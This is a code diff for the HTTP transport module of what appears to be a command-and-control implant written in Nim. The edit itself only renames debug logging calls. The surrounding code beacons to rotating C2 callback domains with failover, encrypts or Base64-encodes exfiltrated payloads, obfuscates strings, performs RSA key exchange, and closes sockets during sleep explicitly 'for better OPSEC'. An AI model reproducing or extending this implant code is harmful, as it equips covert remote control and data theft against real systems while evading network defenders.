@@ -63,10 +63,10 @@ proc newHttpxProfile*(): HttpxProfile =
   # Create persistent HTTP client (reused across all requests)
   result.httpClient = newClientWrapper()
   
-  debug "[DEBUG] HTTPX Profile initialized"
-  debug "[DEBUG] Callback domains: ", result.callbackDomains.join(", ")
-  debug "[DEBUG] Domain rotation: ", result.domainRotation
-  debug "[DEBUG] Failover threshold: ", result.failoverThreshold
+  debugLog "httpx", "HTTPX Profile initialized"
+  debugLog "httpx", "Callback domains: ", result.callbackDomains.join(", ")
+  debugLog "httpx", "Domain rotation: ", result.domainRotation
+  debugLog "httpx", "Failover threshold: ", result.failoverThreshold
 
 proc selectDomain(profile: var HttpxProfile): string =
   ## Select domain based on rotation strategy
@@ -84,39 +84,39 @@ proc send*(profile: var HttpxProfile, data: string, callbackUuid: string = ""): 
   ## Send data to C2 server using raw_c2_config with transforms
   let uuid = if callbackUuid.len > 0: callbackUuid else: profile.config.uuid
   
-  debug "[DEBUG] === SENDING DATA VIA HTTPX ==="
+  debugLog "httpx", "=== SENDING DATA VIA HTTPX ==="
   try:
     let jsonData = parseJson(data)
     if data.len < 2048:
-      debug "[DEBUG] Request JSON:"
+      debugLog "httpx", "Request JSON:"
       debug jsonData.pretty()
     else:
-      debug "[DEBUG] Request: Large payload (", data.len, " bytes)"
+      debugLog "httpx", "Request: Large payload (", data.len, " bytes)"
       if jsonData.hasKey(obf("action")):
-        debug "[DEBUG] Action: ", jsonData["action"].getStr()
+        debugLog "httpx", "Action: ", jsonData["action"].getStr()
   except:
-    debug "[DEBUG] Request data (first 500 chars): ", data[0..<min(500, data.len)]
+    debugLog "httpx", "Request data (first 500 chars): ", data[0..<min(500, data.len)]
   
   # Encrypt or encode payload
   var payload: string
   if profile.aesKey.len > 0 and callbackUuid.len > 0:
-    debug "[DEBUG] Encrypting payload with AES-256-CBC+HMAC"
+    debugLog "httpx", "Encrypting payload with AES-256-CBC+HMAC"
     payload = encryptPayload(data, profile.aesKey, uuid)
   else:
-    debug "[DEBUG] Sending unencrypted payload (Base64 only)"
+    debugLog "httpx", "Sending unencrypted payload (Base64 only)"
     payload = encode(uuid & data)
   
   # Use raw_c2_config if available
   if not profile.rawC2Config.isNil and profile.rawC2Config.kind != JNull:
-    debug "[DEBUG] Using raw_c2_config for HTTPX profile"
+    debugLog "httpx", "Using raw_c2_config for HTTPX profile"
     # Get POST endpoint configuration
     if not profile.rawC2Config.hasKey("post"):
-      debug "[DEBUG] No POST endpoint in raw_c2_config"
+      debugLog "httpx", "No POST endpoint in raw_c2_config"
       return ""
     let postConfig = profile.rawC2Config["post"]
     # Select URI from list
     if not postConfig.hasKey("uris") or postConfig["uris"].len == 0:
-      debug "[DEBUG] No URIs in POST endpoint"
+      debugLog "httpx", "No URIs in POST endpoint"
       return ""
     randomize()
     let uri = postConfig["uris"][rand(postConfig["uris"].len - 1)].getStr()
@@ -129,7 +129,7 @@ proc send*(profile: var HttpxProfile, data: string, callbackUuid: string = ""): 
       try:
         rawResponse = httpxPost(fullUrl, payload, postConfig, profile.httpClient)
       except:
-        debug "[DEBUG] Request failed: ", getCurrentExceptionMsg()
+        debugLog "httpx", "Request failed: ", getCurrentExceptionMsg()
         return ""
     else: # fail-over
       var attempts = 0
@@ -147,7 +147,7 @@ proc send*(profile: var HttpxProfile, data: string, callbackUuid: string = ""): 
             domainSucceeded = true
             break
           except:
-            debug "[DEBUG] Attempt ", domainAttempts + 1, " failed for ", domain
+            debugLog "httpx", "Attempt ", domainAttempts + 1, " failed for ", domain
             domainAttempts += 1
         if domainSucceeded and rawResponse.len > 0:
           # Success - reset to this working domain for next time
@@ -155,27 +155,27 @@ proc send*(profile: var HttpxProfile, data: string, callbackUuid: string = ""): 
           break
         elif domainSucceeded:
           # Got response but it was empty - still move to next domain
-          debug "[DEBUG] Domain ", domain, " returned empty response"
+          debugLog "httpx", "Domain ", domain, " returned empty response"
         else:
           # All attempts failed for this domain - move to next
-          debug "[DEBUG] Domain ", domain, " exhausted all ", profile.failoverThreshold, " attempts"
+          debugLog "httpx", "Domain ", domain, " exhausted all ", profile.failoverThreshold, " attempts"
         checkedDomains += 1
         attempts += 1
       if rawResponse.len == 0:
-        debug "[DEBUG] All domains failed after failover attempts"
+        debugLog "httpx", "All domains failed after failover attempts"
         # Move to next domain for next attempt
         profile.currentDomainIndex = (profile.currentDomainIndex + 1) mod profile.callbackDomains.len
         return ""
     # Check if response is empty (e.g., from HTTP error like 502)
     if rawResponse.len == 0:
-      debug "[DEBUG] Empty response received (possibly HTTP error)"
+      debugLog "httpx", "Empty response received (possibly HTTP error)"
       return ""
     # Decrypt or decode response after transforms have been reversed
     if profile.aesKey.len > 0 and callbackUuid.len > 0:
-      debug "[DEBUG] Decrypting response with AES-256-CBC+HMAC"
+      debugLog "httpx", "Decrypting response with AES-256-CBC+HMAC"
       result = decryptPayload(rawResponse, profile.aesKey)
     else:
-      debug "[DEBUG] Decoding Base64 response"
+      debugLog "httpx", "Decoding Base64 response"
       let decoded = decode(rawResponse)
       if decoded.len > 36:
         result = decoded[36..^1]
@@ -185,7 +185,7 @@ proc send*(profile: var HttpxProfile, data: string, callbackUuid: string = ""): 
   
   else:
     # Fallback to simple HTTP POST (like basic HTTP profile)
-    debug "[DEBUG] No raw_c2_config, using fallback POST"
+    debugLog "httpx", "No raw_c2_config, using fallback POST"
     let baseUrl = profile.selectDomain()
     let fullUrl = baseUrl & "/" & profile.config.postUri
     try:
@@ -202,7 +202,7 @@ proc send*(profile: var HttpxProfile, data: string, callbackUuid: string = ""): 
         else:
           result = ""
     except:
-      debug "[DEBUG] Fallback request failed: ", getCurrentExceptionMsg()
+      debugLog "httpx", "Fallback request failed: ", getCurrentExceptionMsg()
       return ""
 
 proc setAesKey*(profile: var HttpxProfile, key: seq[byte]) =
@@ -220,32 +220,32 @@ proc hasAesKey*(profile: HttpxProfile): bool =
 proc cleanup*(profile: var HttpxProfile) =
   ## Close HTTP client connection to avoid keeping ESTABLISHED connections during sleep
   ## Closes underlying socket connections on both Windows and Linux for better OPSEC
-  debug "[DEBUG] HTTPX Profile: Cleaning up client connection"
+  debugLog "httpx", "HTTPX Profile: Cleaning up client connection"
   # Close the httpclient and its connections
   try:
     profile.httpClient.closeWrapper()
-    debug "[DEBUG] HTTPX Profile: Client connection closed"
+    debugLog "httpx", "HTTPX Profile: Client connection closed"
   except:
-    debug "[DEBUG] HTTPX Profile: Failed to close client: ", getCurrentExceptionMsg()
+    debugLog "httpx", "HTTPX Profile: Failed to close client: ", getCurrentExceptionMsg()
 
 proc reconnect*(profile: var HttpxProfile) =
   ## Recreate HTTP client connection after cleanup
   ## This ensures we have a fresh connection for the next request on both Windows and Linux
   ## Note: HTTPX doesn't set headers here - they're set per-request in httpxPost from raw_c2_config
-  debug "[DEBUG] HTTPX Profile: Recreating client connection"
+  debugLog "httpx", "HTTPX Profile: Recreating client connection"
   profile.httpClient = newClientWrapper()
-  debug "[DEBUG] HTTPX Profile: Client connection recreated"
+  debugLog "httpx", "HTTPX Profile: Client connection recreated"
 
 proc performKeyExchange*(profile: var HttpxProfile): tuple[success: bool, newUuid: string] =
   ## Perform RSA key exchange to establish AES session key
   ## Same implementation as HTTP profile
   
   if not profile.config.encryptedExchange:
-    debug "[DEBUG] No key exchange required (ENCRYPTED_EXCHANGE_CHECK=F)"
+    debugLog "httpx", "No key exchange required (ENCRYPTED_EXCHANGE_CHECK=F)"
     return (true, "")
   
   when not encryptedExchange:
-    debug "[DEBUG] RSA not compiled in"
+    debugLog "httpx", "RSA not compiled in"
     return (true, "")
   
   # Use shared key exchange implementation
@@ -265,5 +265,5 @@ proc performKeyExchange*(profile: var HttpxProfile): tuple[success: bool, newUui
       # No key exchange needed (AESPSK mode)
       return (true, "")
     else:
-      debug "[DEBUG] Key exchange failed: ", exchangeResult.error
+      debugLog "httpx", "Key exchange failed: ", exchangeResult.error
       return (false, "")
